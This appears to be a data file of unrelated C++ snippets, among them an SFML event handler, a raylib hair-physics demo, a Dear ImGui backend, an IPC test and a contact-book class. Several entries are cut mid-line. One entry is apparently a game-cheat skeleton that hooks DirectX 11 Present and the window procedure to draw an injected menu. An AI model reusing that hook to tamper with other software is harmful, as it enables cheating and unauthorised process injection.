    "/*\n * AUTOR(A): Ana Julia Molinos Leite da Silva (ana-molinos)\n * DATA: 15/08/2024\n * Implementa\u00e7\u00e3o da classe que permite o gerenciamento das a\u00e7\u00f5es do usu\u00e1rio via \n * mouse e teclado usando recursos da biblioteca SFML.\n * */\n\n#include \"Gerenciadores/GerenciadorEventos.hpp\"\n#include \"Erros.hpp\"\n\n#include <iostream>\nusing namespace std;\n\nnamespace Gerenciadores\n{\n    GerenciadorEventos* GerenciadorEventos::pGerenciadorEventos(NULL);\n\n    /*Construtora privada que permite a execu\u00e7\u00e3o do padr\u00e3o de projeto Singleton.*/\n    GerenciadorEventos::GerenciadorEventos():\n    pGerenciadorGrafico(GerenciadorGrafico::getGerenciadorGrafico()),\n    pForma(NULL)\n    {\n        \n    }\n\n    GerenciadorEventos::~GerenciadorEventos()\n    {\n        pGerenciadorGrafico = NULL;\n        pForma = NULL;\n\n        if(pGerenciadorEventos)\n            delete pGerenciadorEventos;\n        pGerenciadorEventos = NULL;\n    }\n\n    /* \n     * Se o ponteiro para o gerenciador for nulo, ele instancia um novo objeto do\n     * tipo Gerenciador::GerenciadorEventos e o retorna. Caso contr\u00e1rio, retorna o endere\u00e7o\n     * do gerenciador j\u00e1 existente. Isso garante que exista apenas um gerenciador de\n     * GerenciadorEventoss instanciado no programa, caracter\u00edstica do padr\u00e3o de projeto\n     * Singleton.\n     */\n    GerenciadorEventos* GerenciadorEventos::getGerenciadorEventos()\n    {\n        if(pGerenciadorEventos == NULL)\n            pGerenciadorEventos = new Gerenciadores::GerenciadorEventos();\n            \n        if (pGerenciadorEventos)\n        {\n            return pGerenciadorEventos;\n        }\n        else\n        {\n            cout << \"Em GerenciadorEventos::getGerenciadorEventos: \" << ERRO_ALOCACAO << endl;\n            return NULL;\n        }\n    }\n\n    /*\n     * Configura \"quem\" sofrer\u00e1 a a\u00e7\u00e3o do GerenciadorEventos gerenciado. Provisoriamente \u00e9\n     * um ponteiro do tipo RectangleShape (i.e. uma forma), mas futuramente ser\u00e1 um \n     * ponteiro do tipo Jogador e, se o padr\u00e3o de projeto Observer for implementado, \n     * ser\u00e3o os observadores que ser\u00e3o acionados pelo GerenciadorEventos.\n     */\n    void GerenciadorEventos::setForma(ElementosGraficos::Forma* forma)\n    {\n        if(forma)\n            pForma = forma;\n        else\n        {\n            cout << \"Gerenciadores::GerenciadorEventos: \" << ERRO_SET_NULLPTR << endl;\n            //enterFechar();   \n        }\n    }\n\n    /*Fun\u00e7\u00e3o n\u00e3o implementada uma vez que ainda n\u00e3o se faz conveniente seu uso.*/\n    void GerenciadorEventos::verificaTeclaSolta()\n    {\n\n    }\n\n    /* \n     * Verifica qual tecla est\u00e1 sendo pressionada (Direita, Esquerda, Cima ou Baixo) e faz a forma se\n     * movimentar 0.01 unidade na dire\u00e7\u00e3o da tecla pressionada.\n     */\n    void GerenciadorEventos::verificaTeclaPressionada()\n    {\n        \n        if(sf::Keyboard::isKeyPressed(sf::Keyboard::Right))\n            pForma->getpCorpo()->move(sf::Vector2f(0.1f, 0.f));\n        else if(sf::Keyboard::isKeyPressed(sf::Keyboard::Left))\n            pForma->getpCorpo()->move(sf::Vector2f(-0.1f, 0.f));\n        else if(sf::Keyboard::isKeyPressed(sf::Keyboard::Up))\n            pForma->getpCorpo()->move(sf::Vector2f(0.f, -0.1f));\n        else if(sf::Keyboard::isKeyPressed(sf::Keyboard::Down))\n            pForma->getpCorpo()->move(sf::Vector2f(0.f, 0.1f));\n\n        //Obs.: m\u00e9todo Forma::atualizar() ainda n\u00e3o est\u00e1 sendo utilizado\n    }\n\n\n    /*\n     * Declara uma vari\u00e1vel GerenciadorEventos e, em um loop, prenche essa vari\u00e1vel com entradas vindas do \n     * teclado ou mouse, de modo a definir o que fazer com base no tipo da entrada. \n     */\n    void GerenciadorEventos::executar()\n    {\n        sf::Event Evento;\n\n        /*\n         * sf::Window::pollEvent(Event& event)\n\n         * Returns: True if an event was returned, or false if the event queue was empty.\n\n         * The sf::WindowBase class provides a simple interface for manipulating the window: move, \n         * resize, show/hide, control mouse cursor, etc. It also provides event handling through \n         * its pollEvent() and waitEvent() functions.\n         * \n         * Em resumo: a fun\u00e7\u00e3o captura eventos da janela.\n         */\n\n        //Enquanto a janela \"capturar\" um evento... (i.e., clique ou movimento do mouse)\n        while(pGerenciadorGrafico->getJanela()->pollEvent(Evento))\n        {\n            //Se esse evento for do tipo \"fechar\"...\n            if(Evento.type == sf::Event::Closed)\n                pGerenciadorGrafico->fecharJanela();\n            /*else if (Evento.type == sf::Event::KeyPressed)\n                verificaTeclaPressionada();*/\n        }\n\n        if (pForma) verificaTeclaPressionada();\n    }\n} // namespace Gerenciadores\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"sneaker_shop_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"raylib.h\"\n#include <iostream>\n#include <string>\n#include <cmath>\n#include <vector>\n#include <thread>\n#include <algorithm>\n\nconst int winHeight = 1000;\nconst int winWidth = 1000;\nint hairCount = 1;\nconst int segmentsPerHair = 10;\nfloat segmentLength = 20.0f;\n\nclass Hair\n{\npublic:\n    Vector2 playerPos = { winWidth / 2, winHeight / 2 };\n    float playerRadius = 50.0f;\n    std::vector<std::vector<Vector2>> hairSegments;\n    std::vector<std::vector<Vector2>> hairVelocities;\n    Vector2 prevPlayerPos = { winWidth / 2, winHeight / 2 };\n    bool isPlayerVisible = true;\n    bool drawYellowLine = false;\n\n    Hair()\n    {\n        InitHair();\n    }\n\n    void InitHair()\n    {\n        hairSegments.resize(hairCount, std::vector<Vector2>(segmentsPerHair));\n        hairVelocities.resize(hairCount, std::vector<Vector2>(segmentsPerHair, { 0, 0 }));\n\n        for (int i = 0; i < hairCount; i++)\n        {\n            float angle = (2 * PI / hairCount) * i;\n            for (int j = 0; j < segmentsPerHair; j++)\n            {\n                hairSegments[i][j] = { playerPos.x + (playerRadius + j * segmentLength) * cos(angle),\n                                       playerPos.y + (playerRadius + j * segmentLength) * sin(angle) };\n            }\n        }\n    }\n\n    void ReinitializeHair()\n    {\n        InitHair();\n    }\n\n    void MousePos(float speed = 3.0f)\n    {\n        static bool target = false;\n        Vector2 mousePos = GetMousePosition();\n\n        if (IsMouseButtonDown(MOUSE_BUTTON_LEFT))\n        {\n            if (CheckCollisionPointCircle(mousePos, playerPos, playerRadius))\n            {\n                printf(\"circle tap\\n\");\n                target = true;\n            }\n\n            if (target)\n            {\n                prevPlayerPos = playerPos;\n                playerPos.x += (mousePos.x - playerPos.x) / speed;\n                playerPos.y += (mousePos.y - playerPos.y) / speed;\n\n                std::cout << \"X: \" << playerPos.x << \" Y: \" << playerPos.y << std::endl;\n            }\n        }\n        else\n        {\n            target = false;\n        }\n\n        // Toggle player visibility with the 'Q' key\n        if (IsKeyPressed(KEY_Q))\n        {\n            isPlayerVisible = !isPlayerVisible;\n        }\n    }\n\n    int gravityMode = 3;\n    float gravityValue = 5000;\n    std::string windowTitle;\n\n    void UpdateGravityMode()\n    {\n        if (IsKeyPressed(KEY_ONE))\n        {\n            gravityMode = 1;\n            gravityValue = 5000;\n            std::cout << \"gravity changed to default (default 5000)\\n\";\n        }\n        else if (IsKeyPressed(KEY_TWO))\n        {\n            gravityMode = 2;\n            gravityValue = 250;\n            std::cout << \"gravity changed to 250 (default 5000)\\n\";\n        }\n        else if (IsKeyPressed(KEY_THREE))\n        {\n            gravityMode = 3;\n            gravityValue = 100;\n            std::cout << \"gravity changed to 100 (default 5000)\\n\";\n        }\n\n        // Toggle drawing yellow line with the 'R' key\n        if (IsKeyPressed(KEY_R))\n        {\n            drawYellowLine = !drawYellowLine;\n        }\n\n        windowTitle = \"C++ raylib hair physics || Gravity Mode: \" + std::to_string(gravityMode) + \" : Gravity Value - \" + std::to_string(gravityValue) + \" || Hair = \" + std::to_string(hairCount) + \", segments per one hair = \" + std::to_string(segmentsPerHair) + \" (\" + std::to_string(hairCount * segmentsPerHair) + \")\" + \" || FPS: \" + std::to_string(GetFPS());\n        SetWindowTitle(windowTitle.c_str());\n    }\n\n    void HairPhysicsThread(int start, int end, float dt)\n    {\n        for (int i = start; i < end; i++)\n        {\n            if (i >= hairSegments.size()) continue; // Check for valid index\n            float angle = (2 * PI / hairCount) * i;\n            Vector2 startPos = { playerPos.x + playerRadius * cos(angle), playerPos.y + playerRadius * sin(angle) };\n            hairSegments[i][0] = startPos;\n\n            for (int j = 1; j < segmentsPerHair; j++)\n            {\n                if (j >= hairSegments[i].size()) continue; // Check for valid index\n\n                Vector2 gravity = { 0, gravityValue * dt };\n\n                hairVelocities[i][j].x += gravity.x;\n                hairVelocities[i][j].y += gravity.y;\n\n                Vector2 diff = { hairSegments[i][j - 1].x - hairSegments[i][j].x,\n                                 hairSegments[i][j - 1].y - hairSegments[i][j].y };\n                float length = sqrt(diff.x * diff.x + diff.y * diff.y);\n                float force = (length - segmentLength) * 0.1f;\n                Vector2 springForce = { force * (diff.x / length), force * (diff.y / length) };\n\n                hairVelocities[i][j].x += springForce.x;\n                hairVelocities[i][j].y += springForce.y;\n\n                hairVelocities[i][j].x *= 0.95f;\n                hairVelocities[i][j].y *= 0.95f;\n\n                hairSegments[i][j].x += hairVelocities[i][j].x * dt;\n                hairSegments[i][j].y += hairVelocities[i][j].y * dt;\n\n                diff",
    "#include \"includes.h\"\r\n#include \"mem.h\"\r\n#include \"offsets.h\"\r\n\r\nextern LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);\r\n\r\nPresent oPresent;\r\nHWND window = NULL;\r\nWNDPROC oWndProc;\r\nID3D11Device* pDevice = NULL;\r\nID3D11DeviceContext* pContext = NULL;\r\nID3D11RenderTargetView* mainRenderTargetView;\r\n\r\nvoid InitImGui()\r\n{\r\n\tImGui::CreateContext();\r\n\tImGuiIO& io = ImGui::GetIO();\r\n\tio.ConfigFlags = ImGuiConfigFlags_NoMouseCursorChange;\r\n\tImGui_ImplWin32_Init(window);\r\n\tImGui_ImplDX11_Init(pDevice, pContext);\r\n\tImGuiStyle& style = ImGui::GetStyle();\r\n\r\n\tstyle.Colors[ImGuiCol_Text] = ImVec4(0.86f, 0.93f, 0.89f, 0.78f);\r\n\tstyle.Colors[ImGuiCol_TextDisabled] = ImVec4(0.86f, 0.93f, 0.89f, 0.28f);\r\n\tstyle.Colors[ImGuiCol_WindowBg] = ImVec4(0.13f, 0.14f, 0.17f, 1.00f);\r\n\tstyle.Colors[ImGuiCol_Border] = ImVec4(0.31f, 0.31f, 1.00f, 0.00f);\r\n\tstyle.Colors[ImGuiCol_BorderShadow] = ImVec4(0.00f, 0.00f, 0.00f, 0.00f);\r\n\tstyle.Colors[ImGuiCol_FrameBg] = ImVec4(0.20f, 0.22f, 0.27f, 1.00f);\r\n\tstyle.Colors[ImGuiCol_FrameBgHovered] = ImVec4(0.92f, 0.18f, 0.29f, 0.78f);\r\n\tstyle.Colors[ImGuiCol_FrameBgActive] = ImVec4(0.92f, 0.18f, 0.29f, 1.00f);\r\n\tstyle.Colors[ImGuiCol_TitleBg] = ImVec4(0.20f, 0.22f, 0.27f, 1.00f);\r\n\tstyle.Colors[ImGuiCol_TitleBgCollapsed] = ImVec4(0.20f, 0.22f, 0.27f, 0.75f);\r\n\tstyle.Colors[ImGuiCol_TitleBgActive] = ImVec4(0.92f, 0.18f, 0.29f, 1.00f);\r\n\tstyle.Colors[ImGuiCol_MenuBarBg] = ImVec4(0.20f, 0.22f, 0.27f, 0.47f);\r\n\tstyle.Colors[ImGuiCol_ScrollbarBg] = ImVec4(0.20f, 0.22f, 0.27f, 1.00f);\r\n\tstyle.Colors[ImGuiCol_ScrollbarGrab] = ImVec4(0.09f, 0.15f, 0.16f, 1.00f);\r\n\tstyle.Colors[ImGuiCol_ScrollbarGrabHovered] = ImVec4(0.92f, 0.18f, 0.29f, 0.78f);\r\n\tstyle.Colors[ImGuiCol_ScrollbarGrabActive] = ImVec4(0.92f, 0.18f, 0.29f, 1.00f);\r\n\tstyle.Colors[ImGuiCol_CheckMark] = ImVec4(0.71f, 0.22f, 0.27f, 1.00f);\r\n\tstyle.Colors[ImGuiCol_SliderGrab] = ImVec4(0.47f, 0.77f, 0.83f, 0.14f);\r\n\tstyle.Colors[ImGuiCol_SliderGrabActive] = ImVec4(0.92f, 0.18f, 0.29f, 1.00f);\r\n\tstyle.Colors[ImGuiCol_Button] = ImVec4(0.47f, 0.77f, 0.83f, 0.14f);\r\n\tstyle.Colors[ImGuiCol_ButtonHovered] = ImVec4(0.92f, 0.18f, 0.29f, 0.86f);\r\n\tstyle.Colors[ImGuiCol_ButtonActive] = ImVec4(0.92f, 0.18f, 0.29f, 1.00f);\r\n\tstyle.Colors[ImGuiCol_Header] = ImVec4(0.92f, 0.18f, 0.29f, 0.76f);\r\n\tstyle.Colors[ImGuiCol_HeaderHovered] = ImVec4(0.92f, 0.18f, 0.29f, 0.86f);\r\n\tstyle.Colors[ImGuiCol_HeaderActive] = ImVec4(0.92f, 0.18f, 0.29f, 1.00f);\r\n\tstyle.Colors[ImGuiCol_Separator] = ImVec4(0.14f, 0.16f, 0.19f, 1.00f);\r\n\tstyle.Colors[ImGuiCol_SeparatorHovered] = ImVec4(0.92f, 0.18f, 0.29f, 0.78f);\r\n\tstyle.Colors[ImGuiCol_SeparatorActive] = ImVec4(0.92f, 0.18f, 0.29f, 1.00f);\r\n\tstyle.Colors[ImGuiCol_ResizeGrip] = ImVec4(0.47f, 0.77f, 0.83f, 0.04f);\r\n\tstyle.Colors[ImGuiCol_ResizeGripHovered] = ImVec4(0.92f, 0.18f, 0.29f, 0.78f);\r\n\tstyle.Colors[ImGuiCol_ResizeGripActive] = ImVec4(0.92f, 0.18f, 0.29f, 1.00f);\r\n\tstyle.Colors[ImGuiCol_PlotLines] = ImVec4(0.86f, 0.93f, 0.89f, 0.63f);\r\n\tstyle.Colors[ImGuiCol_PlotLinesHovered] = ImVec4(0.92f, 0.18f, 0.29f, 1.00f);\r\n\tstyle.Colors[ImGuiCol_PlotHistogram] = ImVec4(0.86f, 0.93f, 0.89f, 0.63f);\r\n\tstyle.Colors[ImGuiCol_PlotHistogramHovered] = ImVec4(0.92f, 0.18f, 0.29f, 1.00f);\r\n\tstyle.Colors[ImGuiCol_TextSelectedBg] = ImVec4(0.92f, 0.18f, 0.29f, 0.43f);\r\n\tstyle.Colors[ImGuiCol_PopupBg] = ImVec4(0.20f, 0.22f, 0.27f, 0.9f);\r\n\tstyle.Colors[ImGuiCol_ModalWindowDarkening] = ImVec4(0.20f, 0.22f, 0.27f, 0.73f);\r\n}\r\n\r\nLRESULT __stdcall WndProc(const HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {\r\n\r\n\tif (true && ImGui_ImplWin32_WndProcHandler(hWnd, uMsg, wParam, lParam))\r\n\t\treturn true;\r\n\r\n\treturn CallWindowProc(oWndProc, hWnd, uMsg, wParam, lParam);\r\n}\r\n\r\nbool init = false;\r\nHRESULT __stdcall hkPresent(IDXGISwapChain* pSwapChain, UINT SyncInterval, UINT Flags)\r\n{\r\n\tif (!init)\r\n\t{\r\n\t\tif (SUCCEEDED(pSwapChain->GetDevice(__uuidof(ID3D11Device), (void**)&pDevice)))\r\n\t\t{\r\n\t\t\tpDevice->GetImmediateContext(&pContext);\r\n\t\t\tDXGI_SWAP_CHAIN_DESC sd;\r\n\t\t\tpSwapChain->GetDesc(&sd);\r\n\t\t\twindow = sd.OutputWindow;\r\n\t\t\tID3D11Texture2D* pBackBuffer;\r\n\t\t\tpSwapChain->GetBuffer(0, __uuidof(ID3D11Texture2D), (LPVOID*)&pBackBuffer);\r\n\t\t\tpDevice->CreateRenderTargetView(pBackBuffer, NULL, &mainRenderTargetView);\r\n\t\t\tpBackBuffer->Release();\r\n\t\t\toWndProc = (WNDPROC)SetWindowLongPtr(window, GWLP_WNDPROC, (LONG_PTR)WndProc);\r\n\t\t\tInitImGui();\r\n\t\t\tinit = true;\r\n\t\t}\r\n\r\n\t\telse\r\n\t\t\treturn oPresent(pSwapChain, SyncInterval, Flags);\r\n\t}\r\n\r\n\tif (GetAsyncKeyState(VK_INSERT) & 1) {\r\n\t\tglobals::show = !globals::show;\r\n\t}\r\n\r\n\tif (globals::show)\r\n\t{\r\n\t\tImGui_ImplDX11_NewFrame();\r\n\t\tImGui_ImplWin32_NewFrame();\r\n\t\tImGui::NewFrame();\r\n\r\n\t\tImGui::SetNextWindowSize(ImVec2(450, 225));\r\n\t\tImGui::Begin((\"ImGui Window\"), NULL, ImGuiWindowFlags_NoResize);\r\n\t\t{\r\n\t\t\tImGui::SameLine();\r\n\t\t\tif (ImGui::Button((\"Main\"), ImVec2(225, 30)))\r\n\t\t\t{\r\n\t\t\t\tglobals::tab = 0;\r\n\t\t\t}\r\n\t\t\tImGui::SameLine();\r\n\t\t\tif (ImGui::Button((\"Misc\"), ImVec2(225, 30)))\r",
    "// dear imgui: Platform Backend for Windows (standard windows API for 32 and 64 bits applications)\n// This needs to be used along with a Renderer (e.g. DirectX11, OpenGL3, Vulkan..)\n\n// Implemented features:\n//  [X] Platform: Clipboard support (for Win32 this is actually part of core dear imgui)\n//  [X] Platform: Mouse cursor shape and visibility. Disable with 'io.ConfigFlags |= ImGuiConfigFlags_NoMouseCursorChange'.\n//  [X] Platform: Keyboard arrays indexed using VK_* Virtual Key Codes, e.g. ImGui::IsKeyPressed(VK_SPACE).\n//  [X] Platform: Gamepad support. Enabled with 'io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad'.\n\n// You can use unmodified imgui_impl_* files in your project. See examples/ folder for examples of using this.\n// Prefer including the entire imgui/ repository into your project (either as a copy or as a submodule), and only build the backends you need.\n// If you are new to Dear ImGui, read documentation from the docs/ folder + read the top of imgui.cpp.\n// Read online: https://github.com/ocornut/imgui/tree/master/docs\n\n#include \"imgui.h\"\n#include \"imgui_impl_win32.h\"\n#ifndef WIN32_LEAN_AND_MEAN\n#define WIN32_LEAN_AND_MEAN\n#endif\n#include <windows.h>\n#include <tchar.h>\n#include <dwmapi.h>\n\n// Configuration flags to add in your imconfig.h file:\n//#define IMGUI_IMPL_WIN32_DISABLE_GAMEPAD              // Disable gamepad support. This was meaningful before <1.81 but we now load XInput dynamically so the option is now less relevant.\n\n// Using XInput for gamepad (will load DLL dynamically)\n#ifndef IMGUI_IMPL_WIN32_DISABLE_GAMEPAD\n#include <xinput.h>\ntypedef DWORD (WINAPI *PFN_XInputGetCapabilities)(DWORD, DWORD, XINPUT_CAPABILITIES*);\ntypedef DWORD (WINAPI *PFN_XInputGetState)(DWORD, XINPUT_STATE*);\n#endif\n\n// CHANGELOG\n// (minor and older changes stripped away, please see git history for details)\n//  2021-08-17: Calling io.AddFocusEvent() on WM_SETFOCUS/WM_KILLFOCUS messages.\n//  2021-08-02: Inputs: Fixed keyboard modifiers being reported when host windo doesn't have focus.\n//  2021-07-29: Inputs: MousePos is correctly reported when the host platform window is hovered but not focused (using TrackMouseEvent() to receive WM_MOUSELEAVE events).\n//  2021-06-29: Reorganized backend to pull data from a single structure to facilitate usage with multiple-contexts (all g_XXXX access changed to bd->XXXX).\n//  2021-06-08: Fixed ImGui_ImplWin32_EnableDpiAwareness() and ImGui_ImplWin32_GetDpiScaleForMonitor() to handle Windows 8.1/10 features without a manifest (per-monitor DPI, and properly calls SetProcessDpiAwareness() on 8.1).\n//  2021-03-23: Inputs: Clearing keyboard down array when losing focus (WM_KILLFOCUS).\n//  2021-02-18: Added ImGui_ImplWin32_EnableAlphaCompositing(). Non Visual Studio users will need to link with dwmapi.lib (MinGW/gcc: use -ldwmapi).\n//  2021-02-17: Fixed ImGui_ImplWin32_EnableDpiAwareness() attempting to get SetProcessDpiAwareness from shcore.dll on Windows 8 whereas it is only supported on Windows 8.1.\n//  2021-01-25: Inputs: Dynamically loading XInput DLL.\n//  2020-12-04: Misc: Fixed setting of io.DisplaySize to invalid/uninitialized data when after hwnd has been closed.\n//  2020-03-03: Inputs: Calling AddInputCharacterUTF16() to support surrogate pairs leading to codepoint >= 0x10000 (for more complete CJK inputs)\n//  2020-02-17: Added ImGui_ImplWin32_EnableDpiAwareness(), ImGui_ImplWin32_GetDpiScaleForHwnd(), ImGui_ImplWin32_GetDpiScaleForMonitor() helper functions.\n//  2020-01-14: Inputs: Added support for #define IMGUI_IMPL_WIN32_DISABLE_GAMEPAD/IMGUI_IMPL_WIN32_DISABLE_LINKING_XINPUT.\n//  2019-12-05: Inputs: Added support for ImGuiMouseCursor_NotAllowed mouse cursor.\n//  2019-05-11: Inputs: Don't filter value from WM_CHAR before calling AddInputCharacter().\n//  2019-01-17: Misc: Using GetForegroundWindow()+IsChild() instead of GetActiveWindow() to be compatible with windows created in a different thread or parent.\n//  2019-01-17: Inputs: Added support for mouse buttons 4 and 5 via WM_XBUTTON* messages.\n//  2019-01-15: Inputs: Added support for XInput gamepads (if ImGuiConfigFlags_NavEnableGamepad is set by user application).\n//  2018-11-30: Misc: Setting up io.BackendPlatformName so it can be displayed in the About Window.\n//  2018-06-29: Inputs: Added support for the ImGuiMouseCursor_Hand cursor.\n//  2018-06-10: Inputs: Fixed handling of mouse wheel messages to support fine position messages (typically sent by track-pads).\n//  2018-06-08: Misc: Extracted imgui_impl_win32.cpp/.h away from the old combined DX9/DX10/DX11/DX12 examples.\n//  2018-03-20: Misc: Setup io.BackendFlags ImGuiBackendFlags_HasMouseCursors and ImGuiBackendFlags_HasSetMousePos flags + honor ImGuiConfigFlags_NoMouseCursorChange flag.\n//  2018-02-20: Inputs: Added support for mouse cursors (ImGui::GetMouseCursor() value and WM_SETCURSOR message handling).\n//  2018-02-06: Inputs: Added mapping for ImGuiKey_Space.\n//  2018-02-06: Inputs: Honoring the io.WantSetMousePos by repositioning the mouse (when ",
    "\r\n#include <vector>\r\n#include <iostream>\r\n#include <mutex>\r\n#include <atomic>\r\n#include <cstring>\r\n#include <random.hpp>\r\n#include <Resource.hpp>\r\n#include <ipc/Ipc.h>\r\n#include <ipc/Buffer.h>\r\n\r\n#include \"test.h\"\r\n\r\nusing namespace ipc;\r\n\r\nnamespace {\r\n\r\nconstexpr int LoopCount   = 10000;\r\nconstexpr int MultiMax    = 8;\r\nconstexpr int TestBuffMax = 65536;\r\n\r\nstruct msg_head {\r\n    int id_;\r\n};\r\n\r\nclass RandBuf : public Buffer\r\n{\r\npublic:\r\n    RandBuf() {\r\n        int size = random<>{(int)sizeof(msg_head), TestBuffMax}();\r\n        *this = Buffer(new char[size], size, [](void * p, std::size_t) {\r\n            delete [] static_cast<char *>(p);\r\n        });\r\n    }\r\n\r\n    RandBuf(msg_head const &msg) {\r\n        *this = Buffer(new msg_head{msg}, sizeof(msg), [](void * p, std::size_t) {\r\n            delete static_cast<msg_head *>(p);\r\n        });\r\n    }\r\n\r\n    RandBuf(RandBuf &&) = default;\r\n    RandBuf(RandBuf const & rhs) {\r\n        if (rhs.empty()) return;\r\n        void * mem = new char[rhs.size()];\r\n        std::memcpy(mem, rhs.data(), rhs.size());\r\n        *this = Buffer(mem, rhs.size(), [](void * p, std::size_t) {\r\n            delete [] static_cast<char *>(p);\r\n        });\r\n    }\r\n\r\n    RandBuf(Buffer && rhs)\r\n        : Buffer(std::move(rhs)) {\r\n    }\r\n\r\n    void set_id(int k) noexcept {\r\n        get<msg_head *>()->id_ = k;\r\n    }\r\n\r\n    int get_id() const noexcept {\r\n        return get<msg_head *>()->id_;\r\n    }\r\n\r\n    using Buffer::operator=;\r\n};\r\n\r\nclass data_set {\r\n    std::vector<RandBuf> datas_;\r\n\r\npublic:\r\n    data_set() {\r\n        datas_.resize(LoopCount);\r\n        for (int i = 0; i < LoopCount; ++i) {\r\n            datas_[i].set_id(i);\r\n        }\r\n    }\r\n\r\n    std::vector<RandBuf> const &get() const noexcept {\r\n        return datas_;\r\n    }\r\n} const data_set__;\r\n\r\ntemplate <Relation Rp, Relation Rc, Transmission Ts, typename Que = Ipc<Wr<Rp, Rc, Ts>> >\r\nvoid test_sr(char const * name, int s_cnt, int r_cnt) {\r\n    ipc_ut::sender().start(static_cast<std::size_t>(s_cnt));\r\n    ipc_ut::reader().start(static_cast<std::size_t>(r_cnt));\r\n\r\n    std::atomic_thread_fence(std::memory_order_seq_cst);\r\n    ipc_ut::test_stopwatch sw;\r\n\r\n    for (int k = 0; k < s_cnt; ++k) {\r\n        ipc_ut::sender() << [name, &sw, r_cnt, k] {\r\n            Que que { name, ipc::SENDER };\r\n            sw.start();\r\n            for (int i = 0; i < (int)data_set__.get().size(); ++i) {\r\n                ASSERT_TRUE(que.write(data_set__.get()[i]));\r\n            }\r\n        };\r\n    }\r\n\r\n    for (int k = 0; k < r_cnt; ++k) {\r\n        ipc_ut::reader() << [name] {\r\n            Que que { name, ipc::RECEIVER };\r\n            for (;;) {\r\n                RandBuf got { que.read() };\r\n                ASSERT_FALSE(got.empty());\r\n                int i = got.get_id();\r\n                if (i == -1) {\r\n                    return;\r\n                }\r\n                ASSERT_TRUE((i >= 0) && (i < (int)data_set__.get().size()));\r\n                auto const &data_set = data_set__.get()[i];\r\n                if (data_set != got) {\r\n                    printf(\"data_set__.get()[%d] != got, size = %zd/%zd\\n\", \r\n                            i, data_set.size(), got.size());\r\n                    ASSERT_TRUE(false);\r\n                }\r\n            }\r\n        };\r\n    }\r\n\r\n    ipc_ut::sender().wait_for_done();\r\n    Que que { name };\r\n    for (int k = 0; k < r_cnt; ++k) {\r\n        que.write(RandBuf{msg_head{-1}});\r\n    }\r\n    ipc_ut::reader().wait_for_done();\r\n    sw.print_elapsed<std::chrono::microseconds>(s_cnt, r_cnt, (int)data_set__.get().size(), name);\r\n}\r\n\r\n} // internal-linkage\r\n\r\n\r\nTEST(IPC, UNICAST) {\r\n    test_sr<Relation::SINGLE, Relation::SINGLE, Transmission::UNICAST  >(\"ssu\", 1, 1);\r\n    test_sr<Relation::MULTI, Relation::SINGLE , Transmission::UNICAST  >(\"msu\", 1, 1);\r\n}\r\n\r\nTEST(IPC, BROADCAST) {\r\n    test_sr<Relation::SINGLE , Relation::MULTI , Transmission::BROADCAST  >(\"smb\", MultiMax, MultiMax);\r\n    test_sr<Relation::MULTI , Relation::MULTI , Transmission::BROADCAST>(\"mmb\", MultiMax, MultiMax);\r\n}\r\n",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   Contact.cpp                                        :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: yowoo <yowoo@student.42.fr>                +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/08/03 15:34:40 by yowoo             #+#    #+#             */\n/*   Updated: 2024/08/03 15:44:43 by yowoo            ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include \"Contact.hpp\"\n\t\nContact::Contact(void)\n{\n};\n\nContact::~Contact(void)\n{\n};\n\nvoid Contact::setContact(const std::string& fname, const std::string& lname, const std::string& nname, const std::string& pnum, const std::string& dSecret ){\n\tthis->firstName = fname;\n\tthis->lastName = lname;\n\tthis->nickname= nname;\n\tthis->phoneNumber = pnum;\n\tthis->darksetSecret = dSecret;\n}\n\nstd::string Contact::getfName() const \n{\n\treturn firstName;\n}\n\nstd::string Contact::getlName() const \n{\n\treturn lastName;\n}\n\nstd::string Contact::getnname() const \n{\n\treturn nickname;\n}\n\nstd::string Contact::getpNumber() const \n{\n\treturn phoneNumber;\n}\n\nstd::string Contact::getdsSecret() const \n{\n\treturn darksetSecret;\n}\n\nvoid Contact::display() const \n{\n\t\tstd::cout << \"|\"<<std::setw(10) << std::right << getfName();\n\t\tstd::cout << \"|\"<<std::setw(10) << std::right << getlName();\n\t\tstd::cout << \"|\"<<std::setw(10) << std::right << getnname();\n\t\tstd::cout << \"|\"<<std::endl;\n}",
